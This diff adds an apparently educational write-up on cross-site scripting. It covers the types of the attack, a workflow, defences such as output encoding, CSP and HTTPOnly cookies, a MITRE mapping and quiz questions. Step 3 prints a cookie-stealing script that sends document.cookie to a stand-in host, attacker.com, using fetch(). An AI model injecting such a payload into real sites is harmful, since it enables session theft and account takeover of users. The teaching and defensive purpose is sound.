@@ -1,0 +1,307 @@
+Cross-Site Scripting (XSS) Attack
+- A client-side web attack where attackers inject malicious scripts into web pages viewed by other users.
+
+==================================================
+Attack Metadata
+==================================================
+
+Category:
+Web Attacks → Client-Side Attacks
+
+Attack Stage:
+Initial Access
+Credential Access
+Privilege Escalation
+
+Difficulty:
+Beginner
+
+Stealth Level:
+Medium
+
+Requires Authentication:
+No (depends on vulnerability context)
+
+Tools Used:
+Burp Suite
+OWASP ZAP
+Browser Developer Tools
+Custom JavaScript Payloads
+
+
+==================================================
+1. Overview
+==================================================
+Cross-Site Scripting (XSS) occurs when a web application includes untrusted user input in a webpage without proper validation or encoding.
+
+Attackers exploit this behavior by injecting malicious JavaScript that executes in the victim's browser.
+
+Because the script runs within the trusted website context, it can:
+
+- access cookies
+- steal session tokens
+- modify page content
+- redirect users
+- perform actions on behalf of the victim
+
+XSS is one of the most common web application vulnerabilities.
+
+
+==================================================
+2. Types of XSS
+==================================================
+
+Stored XSS
+
+The malicious payload is stored on the server.
+
+Examples include:
+
+- comment fields
+- forum posts
+- user profiles
+
+Every user who loads the page executes the malicious script.
+
+
+Reflected XSS
+
+The malicious payload is included in a request and immediately reflected in the response.
+
+This typically occurs in:
+
+- search parameters
+- URL parameters
+- error messages
+
+The attack usually requires the victim to click a crafted link.
+
+
+DOM-Based XSS
+
+The vulnerability exists in client-side JavaScript code.
+
+The browser modifies the page based on untrusted input without proper validation.
+
+
+==================================================
+3. Attack Scenario
+==================================================
+A web application displays user-generated content without sanitizing it.
+
+An attacker submits the following payload in a comment field:
+
+<script>alert('XSS')</script>
+
+When other users view the page, their browsers execute the injected JavaScript.
+
+The attacker can instead insert scripts designed to steal session cookies or redirect users to malicious websites.
+
+
+==================================================
+4. Tools Required
+==================================================
+
+Burp Suite
+Used to intercept and test web requests.
+
+OWASP ZAP
+Used for vulnerability testing.
+
+Browser Developer Tools
+Used to analyze client-side behavior.
+
+Custom JavaScript Payloads
+Used to test injection points.
+
+
+==================================================
+5. Attack Workflow
+==================================================
+
+Identify Input Field
+        ↓
+Test Input Reflection
+        ↓
+Inject Malicious Script
+        ↓
+Victim Loads Vulnerable Page
+        ↓
+Script Executes in Browser
+        ↓
+Attacker Steals Data or Hijacks Session
+
+
+==================================================
+6. Step-by-Step Execution
+==================================================
+Step 1 — Identify Input Field
+
+The attacker finds a field where user input is displayed.
+
+Examples:
+
+- comment forms
+- search boxes
+- profile fields
+
+
+Step 2 — Test for Reflection
+
+Example payload:
+
+<script>alert(1)</script>
+
+If the alert appears in the browser, the input may be vulnerable.
+
+
+Step 3 — Craft Malicious Payload
+
+Example payload to steal cookies:
+
+<script>
+fetch("http://attacker.com/steal?cookie=" + document.cookie);
+</script>
+
+
+Step 4 — Deliver Payload
+
+For reflected XSS, the attacker sends the crafted URL to the victim.
+
+
+Step 5 — Victim Executes Script
+
+When the victim loads the page, the injected script runs automatically.
+
+
+Step 6 — Capture Sensitive Data
+
+The attacker receives the victim's cookies or session token.
+
+
+==================================================
+7. Example XSS Scenario
+==================================================
+Vulnerable Comment Field
+
+User input is displayed without sanitization.
+
+
+Script Injection
+
+The attacker inserts a malicious script.
+
+
+Victim Visits Page
+
+The script executes in the victim's browser.
+
+
+Session Theft
+
+The attacker captures session cookies.
+
+
+Account Compromise
+
+The attacker hijacks the victim's account.
+
+
+==================================================
+8. Expected Results
+==================================================
+Successful XSS attacks allow attackers to:
+
+- steal session cookies
+- perform actions as the victim
+- redirect users to malicious sites
+- deface web pages
+- install browser-based malware
+
+XSS attacks can lead to full account compromise.
+
+
+==================================================
+9. Defensive Considerations
+==================================================
+Organizations should implement strong input validation and output encoding.
+
+Input Validation
+
+Reject or sanitize untrusted input.
+
+Output Encoding
+
+Encode user input before displaying it.
+
+Content Security Policy (CSP)
+
+Restrict execution of unauthorized scripts.
+
+HTTPOnly Cookies
+
+Prevent JavaScript access to session cookies.
+
+Secure Development Practices
+
+Use frameworks that automatically handle input encoding.
+
+
+==================================================
+10. MITRE ATT&CK Mapping
+==================================================
+
+Technique:
+T1059 — Command and Scripting Interpreter
+
+Sub-technique:
+T1059.007 — JavaScript
+
+Technique:
+T1539 — Steal Web Session Cookie
+
+Technique:
+T1185 — Browser Session Hijacking
+
+
+==================================================
+11. Questions & Answers
+==================================================
+
+Question:
+What is Cross-Site Scripting (XSS)?
+
+Answer:
+A web vulnerability where attackers inject malicious scripts into web pages viewed by other users.
+
+--------------------------------------------------
+
+Question:
+What are the three main types of XSS?
+
+Answer:
+Stored XSS, Reflected XSS, and DOM-Based XSS.
+
+--------------------------------------------------
+
+Question:
+What sensitive information is often stolen using XSS?
+
+Answer:
+Session cookies.
+
+--------------------------------------------------
+
+Question:
+Why are HTTPOnly cookies useful against XSS?
+
+Answer:
+They prevent JavaScript from accessing session cookies.
+
+--------------------------------------------------
+
+Question:
+What is one of the most effective defenses against XSS?
+
+Answer:
+Proper input validation and output encoding.
